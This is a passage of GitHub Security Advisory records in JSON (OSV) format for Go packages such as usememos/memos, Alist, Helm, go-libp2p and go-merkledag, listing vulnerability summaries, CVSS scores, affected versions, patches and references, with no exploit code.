Patches\n\n- This has already been patched in d24f14f8be70d94129d76026e8b0f4f9170c8c3e, and is available in releases >= v2.0.0.\n\n### References\n_Are there any links users can visit to find out more?_\n\n- See https://docs.github.com/en/developers/apps/building-github-apps/authenticating-with-github-apps#authenticating-as-an-installation for the App installation flow.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [ghinstallation](https://github.com/bradleyfalzon/ghinstallation)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bradleyfalzon/ghinstallation"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/bradleyfalzon/ghinstallation/security/advisories/GHSA-h4q8-96p6-jcgr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39304"}, {"type": "WEB", "url": "https://github.com/bradleyfalzon/ghinstallation/commit/d24f14f8be70d94129d76026e8b0f4f9170c8c3e"}, {"type": "WEB", "url": "https://docs.github.com/en/developers/apps/building-github-apps/authenticating-with-github-apps#authenticating-as-an-installation"}, {"type": "PACKAGE", "url": "https://github.com/bradleyfalzon/ghinstallation"}, {"type": "WEB", "url": "https://github.com/bradleyfalzon/ghinstallation/blob/24e56b3fb7669f209134a01eff731d7e2ef72a5c/transport.go#L172-L174"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1178"}, {"type": "ADVISORY", "url": "https://securitylab.github.com/advisories/GHSL-2022-061_ghinstallation/"}], "database_specific": {"cwe_ids": ["CWE-209"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-19T22:48:32Z", "nvd_published_at": "2022-12-20T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-957m-g6rf-4c2m", "modified": "2022-12-14T21:54:33Z", "published": "2022-12-12T15:30:31Z", "aliases": ["CVE-2022-45970"], "summary": "Alist Cross-site Scripting vulnerability", "details": "Alist v3.5.1 is vulnerable to Cross Site Scripting (XSS) via the bulletin board.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/alist-org/alist/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45970"}, {"type": "WEB", "url": "https://github.com/alist-org/alist/issues/2457"}, {"type": "PACKAGE", "url": "https://github.com/alist-org/alist"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-12T22:49:04Z", "nvd_published_at": "2022-12-12T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vwg4-846x-f94v", "modified": "2023-01-02T20:16:09Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4688"], "summary": "usememos/memos vulnerable to improper authorization", "details": "usememos/memos is an open-source, self-hosted memo hub with knowledge management and socialization. Memos versions prior to 0.9.0 are vulnerable to improper authorization, which can allow a user to modify the nickname, username and email of other users without permission.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4688"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/dca35bde877aab6e64ef51b52e590b5d48f692f9"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/23856e7e-94ff-4dee-97d0-0cd47e9b8ff6"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-27T01:57:43Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rmhx-9h5h-3xh3", "modified": "2023-01-10T00:54:30Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4841"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4841"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/64e5c343c5f74b0abdf3ac0d21a6139daea58cf8"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/fa46b3ef-c621-443a-be3a-0a83fb78ba62"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:53:30Z", "nvd_published_at": "2022-12-29T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x39j-h85h-3f46", "modified": "2022-12-09T15:21:18Z", "published": "2022-12-08T16:12:26Z", "aliases": ["CVE-2022-23495"], "summary": "go-merkledag's ProtoNode may be modified such that common method calls may panic", "details": "### Impact\n\nA `ProtoNode` may be modified in such a way as to cause various encode errors which will trigger a panic on common method calls that don't allow for error returns.\n\nA `ProtoNode` should only be able to encode to valid DAG-PB, attempting to encode invalid DAG-PB forms will result in an error from the codec. Manipulation of an existing (newly created or decoded) `ProtoNode` using the modifier methods did not account for certain states that would place the `ProtoNode` into an unencodeable form.\n\nDue to conformance with the [`github.com/ipfs/go-block-format#Block`](https://pkg.go.dev/github.com/ipfs/go-block-format#Block) and [`github.com/ipfs/go-ipld-format#Node`](https://pkg.go.dev/github.com/ipfs/go-ipld-format#Node) interfaces, certain methods, which internally require a re-encode if state has changed, will panic due to the inability to return an error.\n\nAdditionally, use of the `ProtoNode#SetCidBuilder()` method to set a non-functioning `CidBuilder` (such as one that refers to a multihash where an implementation of that hash function is not available) may cause the same methods to panic as a new CID is required but cannot be created.\n\n### Patches\n\nReleases involving fixes for this issue are [v0.8.0](https://github.com/ipfs/go-merkledag/releases/tag/v0.8.0) and [v0.8.1](https://github.com/ipfs/go-merkledag/releases/tag/v0.8.1). The recommended minimum version is **v0.8.1**.\n\n* Additional checks are performed on `ProtoNode` state changes to avoid the possibility of creating unencodeable forms, errors are returned where this is the case.\n* The builder passed in to `SetCidBuilder()` is inspected to attempt to determine if it is usable to generate CIDs, otherwise an error is returned.\n* The panics have been removed and replaced with default values (empty byte slice for `RawData()` and a default zero-bytes DAG-PB CID for methods involving CIDs).\n\n### Workarounds\n\nThese workarounds are available when using impacted versions to avoid panic conditions, and may be generally appropriate in order to provide meaningful feedback to users and avoid generating bad, or unexpected encoded data:\n\n* Sanitise inputs when allowing user-input to set a new `CidBuilder` on a `ProtoNode`.\n* Sanitise `Tsize` (`Link#Size`) values such that they are a reasonable byte-size for sub-DAGs where derived from user-input.\n\n### References\n\n* https://github.com/ipfs/kubo/issues/9297\n* https://github.com/ipfs/go-merkledag/issues/90\n* https://github.com/ipfs/go-merkledag/releases/tag/v0.8.0\n* https://github.com/ipfs/go-merkledag/pull/91\n* https://github.com/ipfs/go-merkledag/pull/92\n* https://github.com/ipfs/go-merkledag/pull/93\n* https://github.com/ipfs/go-merkledag/releases/tag/v0.8.1\n\n\n### Credit\n\nThanks to [@mrd0ll4r](https://github.com/mrd0ll4r) for reporting the original error to Kubo!", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-merkledag"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.4.0"}, {"fixed": "0.8.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/security/advisories/GHSA-x39j-h85h-3f46"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23495"}, {"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/issues/90"}, {"type": "WEB", "url": "https://github.com/ipfs/kubo/issues/9297"}, {"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/pull/91"}, {"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/pull/92"}, {"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/pull/93"}, {"type": "WEB", "url": "https://en.wikipedia.org/wiki/Directed_acyclic_graph"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-merkledag"}, {"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/releases/tag/v0.8.0"}, {"type": "WEB", "url": "https://github.com/ipfs/go-merkledag/releases/tag/v0.8.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1155"}], "database_specific": {"cwe_ids": ["CWE-252", "CWE-755"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-08T16:12:26Z", "nvd_published_at": "2022-12-08T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jcr6-mmjj-pchw", "modified": "2023-01-10T15:59:32Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2017-20146"], "summary": "gorilla/handlers may allow requester to bypass expected behavior of the Same Origin Policy", "details": "Usage of the CORS handler may apply improper CORS headers, allowing the requester to explicitly control the value of the Access-Control-Allow-Origin header, which bypasses the expected behavior of the Same Origin Policy.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gorilla/handlers"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-20146"}, {"type": "WEB", "url": "https://github.com/gorilla/handlers/pull/116"}, {"type": "WEB", "url": "https://github.com/gorilla/handlers/commit/90663712d74cb411cbef281bc1e08c19d1a76145"}, {"type": "PACKAGE", "url": "https://github.com/gorilla/handlers"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0020"}], "database_specific": {"cwe_ids": ["CWE-346"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:18:39Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4gjr-vgfx-9qvw", "modified": "2022-12-14T21:54:22Z", "published": "2022-12-12T15:30:31Z", "aliases": ["CVE-2022-45968"], "summary": "AList vulnerable to Improper Preservation of Permissions", "details": "Alist v3.4.0 is vulnerable to File Upload. A user with only file upload permission can upload any file to any folder (even a password protected one). Version 3.5.1 contains a patch.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/alist-org/alist/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45968"}, {"type": "WEB", "url": "https://github.com/alist-org/alist/issues/2444"}, {"type": "WEB", "url": "https://github.com/alist-org/alist/commit/85e1350af82e1759ca6580895e48ab969eb566cf"}, {"type": "PACKAGE", "url": "https://github.com/alist-org/alist"}], "database_specific": {"cwe_ids": ["CWE-281", "CWE-434"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-12T22:30:02Z", "nvd_published_at": "2022-12-12T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6q6q-88xp-6f2r", "modified": "2023-03-01T18:40:10Z", "published": "2022-12-28T00:30:22Z", "aliases": ["CVE-2022-3064"], "summary": "yaml package for Go can consume excessive amounts of CPU or memory", "details": "Parsing malicious or large YAML documents can consume excessive amounts of CPU or memory", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/yaml.v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3064"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/commit/f221b8435cfb71e54062f6c6e99e9ade30b124d5"}, {"type": "PACKAGE", "url": "https://github.com/go-yaml/yaml"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/releases/tag/v2.2.4"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/07/msg00001.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4SBIUECMLNC572P23DDOKJNKPJVX26SP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ANIOPUXWIHVRA6CEWXCGOMX3YYS6KFHG/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PW3XC47AUW5J5M2ULJX7WCCL3B2ETLMT/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0956"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:04:00Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6jvc-q2x7-pchv", "modified": "2023-01-06T03:20:04Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2022-2582"], "summary": "AWS S3 Crypto SDK sends an unencrypted hash of the plaintext alongside the ciphertext as a metadata field", "details": "The AWS S3 Crypto SDK sends an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext, if the hash is readable to the attacker. AWS now blocks this metadata field, but older SDK versions still send it.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/aws/aws-sdk-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.34.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2582"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/commit/35fa6ddf45c061e0f08d3a3b5119f8f4da38f6d1"}, {"type": "PACKAGE", "url": "https://github.com/aws/aws-sdk-go"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0391"}], "database_specific": {"cwe_ids": ["CWE-326"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:53:40Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-47xh-qxqv-mgvg", "modified": "2022-12-02T22:24:44Z", "published": "2022-12-02T22:24:44Z", "aliases": [], "summary": "kube-httpcache is vulnerable to Cross-Site Request Forgery (CSRF)", "details": "### Impact\n\n> A request forgery attack can be performed on Varnish Cache servers that have the HTTP/2 protocol turned on. An attacker may introduce characters through the HTTP/2 pseudo-headers that are invalid in the context of an HTTP/1 request line, causing the Varnish server to produce invalid HTTP/1 requests to the backend. This may in turn be used to successfully exploit vulnerabilities in a server behind the Varnish server.\n> -- https://varnish-cache.org/security/VSV00011.html#vsv00011\n\n### Patches\n\nThis is fixed in Varnish 6.0.11; Varnish 6.0.11 is available in `kube-httpcache` versions v0.7.1 and later.\n\n### Workarounds\n\nSee [upstream mitigation hints](https://varnish-cache.org/security/VSV00011.html#mitigation).\n\n### References\n\n- https://varnish-cache.org/security/VSV00011.html#vsv00011\n\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mittwald/kube-httpcache"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/mittwald/kube-httpcache/security/advisories/GHSA-47xh-qxqv-mgvg"}, {"type": "PACKAGE", "url": "https://github.com/mittwald/kube-httpcache"}, {"type": "WEB", "url": "https://varnish-cache.org/security/VSV00011.html#vsv00011"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-02T22:24:44Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f83p-pg86-p922", "modified": "2023-01-10T15:41:37Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4801"], "summary": "usememos/memos has Insufficient Granularity of Access Control", "details": "usememos/memos 0.9.0 and prior allows an attacker to archive any user's public or private post.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4801"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b0795261-0f97-4f0b-be44-9dc079e01593"}], "database_specific": {"cwe_ids": ["CWE-1220"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:57:52Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-642q-2q68-9j3p", "modified": "2023-01-10T00:52:48Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4849"], "summary": "usememos/memos Cross-Site Request Forgery vulnerability", "details": "Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4849"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/404ce7dd-f345-4d98-ad80-c53ac74f4e5c"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:53:06Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v92p-phmp-xffr", "modified": "2023-01-09T08:21:08Z", "published": "2022-12-27T15:30:19Z", "aliases": ["CVE-2022-4694"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4694"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/65cc19c12efa392f792f6bb154b4838547e0af5e"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/a4d865c2-1a2b-4e3a-aaae-915b0dfc3f22"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:02:50Z", "nvd_published_at": "2022-12-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-53c4-hhmh-vw5q", "modified": "2023-08-30T18:40:46Z", "published": "2022-12-14T21:38:31Z", "aliases": ["CVE-2022-23525"], "summary": "Helm vulnerable to denial of service through through repository index file", "details": "Fuzz testing, by Ada Logics and sponsored by the CNCF, identified input to functions in the `_repo_` package that can cause a segmentation violation. Applications that use functions from the `_repo_` package in the Helm SDK can have a Denial of Service attack when they use this package and it panics.\n\n### Impact\n\nThe `_repo_` package contains a handler that processes the index file of a repository. For example, the Helm client adds references to chart repositories where charts are managed. The `_repo_` package parses the index file of the repository and loads it into structures Go can work with. Some index files can cause array data structures to be created causing a memory violation.\n\nApplications that use the `_repo_` package in the Helm SDK to parse an index file can suffer a Denial of Service when that input causes a panic that cannot be recovered from.\n\nThe Helm Client will panic with an index file that causes a memory violation panic. Helm is not a long running service so the panic will not affect future uses of the Helm client.\n\n### Patches\n\nThis issue has been resolved in 3.10.3. \n\n### Workarounds\n\nSDK users can validate index files that are correctly formatted before passing them to the `_repo_` functions.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.10.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-53c4-hhmh-vw5q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23525"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/638ebffbc2e445156f3978f02fd83d9af1e56f5b"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1165"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-14T21:38:31Z", "nvd_published_at": "2022-12-15T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j7qp-mfxf-8xjw", "modified": "2023-02-14T21:25:56Z", "published": "2022-12-07T23:13:02Z", "aliases": ["CVE-2022-23492"], "summary": "libp2p DoS vulnerability from lack of resource management", "details": "### Impact\nVersions older than `v0.18.0` of go-libp2p are vulnerable to targeted resource exhaustion attacks. These attacks target libp2p\u2019s connection, stream, peer, and memory management. An attacker can cause the allocation of large amounts of memory, ultimately leading to the process getting killed by the host\u2019s operating system. While a connection manager tasked with keeping the number of connections within manageable limits has been part of go-libp2p, this component was designed to handle the regular churn of peers, not a targeted resource exhaustion attack.\n\nIn the original version of the attack, the malicious node would continue opening new streams on a stream multiplexer that doesn\u2019t provide sufficient back pressure (yamux or mplex). It is easy to defend against this one attack, but there are countless variations of this attack:\n* Opening streams and causing a non-trivial memory allocation (e.g., for multistream or protobuf parsing)\n* Creating a lot of sybil nodes and opening new connections across nodes\n\n### Patches (What to do as a go-libp2p consumer:)\n1. Update your go-libp2p dependency to go-libp2p v0.18.0 or greater (current version as of publish date is [v0.24.0](https://github.com/libp2p/go-libp2p/releases/tag/v0.24.0).)\n    - Note: **It's recommend that you update to `v0.21.0` onwards** as you\u2019ll get some useful functionality that will help in production environments like better metrics around resource usage, Grafana dashboards around resource usage, allow list support, and default autoscaling limits. [Please see the v0.21.0 release notes for more info.](https://github.com/libp2p/go-libp2p/releases/tag/v0.21.0))\n\n2. Determine appropriate limits for your application - go-libp2p sets up a resource manager with the default limits if none are provided. For default definitions please see [limits_defaults.go](https://github.com/libp2p/go-libp2p/blob/master/p2p/host/resource-manager/limit_defaults.go). These limits are also set to automatically scale, this is done using the [AutoScale method of the ScalingLimitConfig](https://github.com/libp2p/go-libp2p/blob/master/p2p/host/resource-manager/README.md#scaling-limits). We recommend you [tune your limits as described here](https://github.com/libp2p/go-libp2p/blob/master/p2p/host/resource-manager/README.md#how-to-tune-your-limits).\n\n3. Configure your node to be attack resilient. See [how to respond to an attack and identify misbehaving peers here](https://docs.libp2p.io/concepts/security/dos-mitigation/#responding-to-an-attack). Then setup automatic blocking with fail2ban using canonical libp2p log lines: [guide on how to do so here](https://docs.libp2p.io/concepts/security/dos-mitigation/#how-to-automate-blocking-with-fail2ban).\n\n#### Examples\n* Lotus\u2019 integration can be found in https://github.com/filecoin-project/lotus/blob/master/node/modules/lp2p/rcmgr.go. Lotus reads user-configured resource limits from a limits.json file into the root directory. This allows users to share their resource manager configuration independent of any other configurations.\n* Kubo\u2019s (formerly go-ipfs) integration can be found in https://github.com/ipfs/go-ipfs/blob/master/core/node/libp2p/rcmgr.go. Kubo reads the limits from the IPFS config file.\n\n**Note:** go-libp2p still implements the [connection manager](https://github.com/libp2p/go-libp2p/tree/master/p2p/net/connmgr) mentioned above. The connection manager is a component independent of the resource manager, which aims to keep the number of libp2p connections between a low and a high watermark. When modifying connection limits, it\u2019s advantageous to keep the configuration of these components consistent, i.e., when setting a limit of N concurrent connections in the resource manager, the high watermark should be at most (and ideally slightly less) than N.\n\n### Workarounds\nAlthough there are no workarounds within go-libp2p, some range of attacks can be mitigated using OS tools (like manually blocking malicious peers using `iptables` or `ufw` ) or making use of a load balancer in front of libp2p nodes.\n\nHowever these require direct action & responsibility on your part and are no substitutes for upgrading go-libp2p. Therefore, we highly recommend upgrading your go-libp2p version for the way it enables tighter scoped limits and provides visibility into and easier reasoning about go-libp2p resource utilization.\n\n### References\nPlease see our DoS Mitigation page for more information on how to incorporate mitigation strategies, monitor your application, and respond to attacks: https://docs.libp2p.io/reference/dos-mitigation/. \n\nPlease see the related disclosure for rust-libp2p: https://github.com/libp2p/rust-libp2p/security/advisories/GHSA-jvgw-gccv-q5p8 and js-libp2p: https://github.com/libp2p/js-libp2p/security/advisories/GHSA-f44q-634c-jvwv\n\n#### For more information\n\nIf you have any questions or comments about this advisory email us at [security@libp2p.io](mailto:security@libp2p.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/libp2p/go-libp2p"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.18.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/security/advisories/GHSA-j7qp-mfxf-8xjw"}, {"type": "WEB", "url": "https://github.com/libp2p/js-libp2p/security/advisories/GHSA-f44q-634c-jvwv"}, {"type": "WEB", "url": "https://github.com/libp2p/rust-libp2p/security/advisories/GHSA-jvgw-gccv-q5p8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23492"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/commit/15d7dfbf54264ead8e6f49ca658d79c90635e2de"}, {"type": "WEB", "url": "https://docs.libp2p.io/reference/dos-mitigation/"}, {"type": "PACKAGE", "url": "https://github.com/libp2p/go-libp2p"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1148"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-07T23:13:02Z", "nvd_published_at": "2022-12-08T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6w5w-wx8w-2cq9", "modified": "2023-01-10T15:43:07Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4809"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "usememos/memos 0.9.0 and prior is vulnerable to full account takeover via changing user name, email address, and display name.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": 